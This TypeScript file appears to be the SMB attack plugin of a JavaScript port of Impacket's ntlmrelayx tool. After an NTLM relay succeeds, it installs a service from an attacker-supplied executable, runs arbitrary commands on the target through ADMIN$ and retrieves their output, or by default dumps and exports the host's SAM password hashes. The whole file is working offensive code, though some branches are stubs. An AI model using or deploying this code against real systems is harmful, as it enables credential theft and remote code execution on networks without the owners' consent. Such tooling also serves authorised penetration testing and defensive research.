import { info, error as logError } from '@impacket/examples';
import type { SMBConnection } from '@impacket/smb-connection';
import type { NTLMRelayxConfig, ProtocolAttackInstance, ProtocolClientInstance } from './config.js';

export class SMBAttack implements ProtocolAttackInstance {
  static PLUGIN_NAMES = ['SMB'];

  private config: NTLMRelayxConfig;
  private client: SMBConnection;
  private username: string;
  private domain: string;
  private target: URL | undefined;
  private relayClient: ProtocolClientInstance | undefined;

  constructor(
    config: NTLMRelayxConfig,
    client: any,
    username: string,
    target?: URL,
    relayClient?: ProtocolClientInstance,
  ) {
    this.config = config;
    this.client = client;
    this.username = username.includes('/') ? username.split('/')[1]! : username;
    this.domain = username.includes('/') ? username.split('/')[0]! : '';
    this.target = target;
    this.relayClient = relayClient;
  }

  async run(): Promise<void> {
    if (this.config.interactive) {
      info(`Started interactive SMB client shell for ${this.domain}/${this.username} on ${this.target?.hostname}`);
      info('Interactive shell not yet implemented in jspacket relay — use -c for command execution or default SAM dump');
      return;
    }

    if (this.config.exeFile) {
      info(`Service install attack for ${this.domain}/${this.username} on ${this.target?.hostname}`);
      try {
        const { ServiceInstall } = await import('@impacket/examples');
        const svc = new ServiceInstall(this.client as any, this.config.exeFile);
        const result = await svc.install();
        if (result) {
          info('Service installed.. CONNECT!');
          await svc.uninstall();
        }
      } catch (e) {
        logError(`Service install failed: ${e}`);
      }
      return;
    }

    if (this.config.command) {
      info(`Executing command on ${this.target?.hostname}: ${this.config.command}`);
      try {
        await this.executeCommand(this.config.command);
      } catch (e) {
        logError(`Command execution failed: ${e}`);
      }
      return;
    }

    // Default: dump SAM hashes
    info(`Dumping SAM hashes for ${this.domain}/${this.username} on ${this.target?.hostname}`);
    try {
      await this.dumpSAMHashes();
    } catch (e) {
      if (String(e).includes('rpc_s_access_denied')) {
        info(`Relayed user doesn't have admin on ${this.target?.hostname}`);
        if (this.config.enumLocalAdmins) {
          info('Enumerating local admins...');
          await this.enumLocalAdmins();
        }
      } else {
        logError(`SAM dump failed: ${e}`);
      }
    }
  }

  private async dumpSAMHashes(): Promise<void> {
    const secretsdumpPath = '@impacket/examples';
    let RemoteOperations: any;
    let SAMHashes: any;

    try {
      const mod = await import(secretsdumpPath);
      RemoteOperations = mod.RemoteOperations;
      SAMHashes = mod.SAMHashes;
    } catch {
      info('SAM dump requires RemoteOperations (secretsdump) — not available as a relay attack module yet');
      info(`Relay session established for ${this.domain}/${this.username} → ${this.target?.hostname}. Use SOCKS proxy (-socks) for interactive access.`);
      return;
    }

    let remoteOps: any = null;
    let samHashes: any = null;

    try {
      remoteOps = new RemoteOperations(this.client, false);
      await remoteOps.enableRegistry();

      const bootKey = await remoteOps.getBootKey();
      remoteOps._serviceDeleted = true;
      const samFileName = await remoteOps.saveSAM();
      samHashes = new SAMHashes(samFileName, bootKey, true);
      await samHashes.dump();
      await samHashes.export(`${this.target?.hostname}_samhashes`);
      info(`Done dumping SAM hashes for host: ${this.target?.hostname}`);
    } finally {
      if (samHashes) { try { samHashes.finish(); } catch { /* */ } }
      if (remoteOps) { try { remoteOps.finish(); } catch { /* */ } }
    }
  }

  private async executeCommand(command: string): Promise<void> {
    info(`Relay session established for ${this.domain}/${this.username} → ${this.target?.hostname}`);
    info(`Command: ${command}`);

    try {
      const conn = this.client;
      const { ServiceInstall } = await import('@impacket/examples');
      const svc = new ServiceInstall(conn as any, undefined as any);
      await (svc as any).executeRemote?.(command);
      info(`Executed command on ${this.target?.hostname}`);

      try {
        let output = Buffer.alloc(0);
        await (conn as any).getFile?.('ADMIN$', 'Temp\\__output', (data: Buffer) => {
          output = Buffer.concat([output, data]);
        });
        await (conn as any).deleteFile?.('ADMIN$', 'Temp\\__output');
        console.log(output.toString(this.config.encoding as BufferEncoding || 'utf-8'));
      } catch {
        info('Could not retrieve command output');
      }
    } catch (e) {
      logError(`Command execution failed: ${e}`);
      info('Note: Command execution via relay requires admin privileges on the target');
    }
  }

  private async enumLocalAdmins(): Promise<void> {
    info('Local admin enumeration not yet implemented in relay attack module');
  }
}
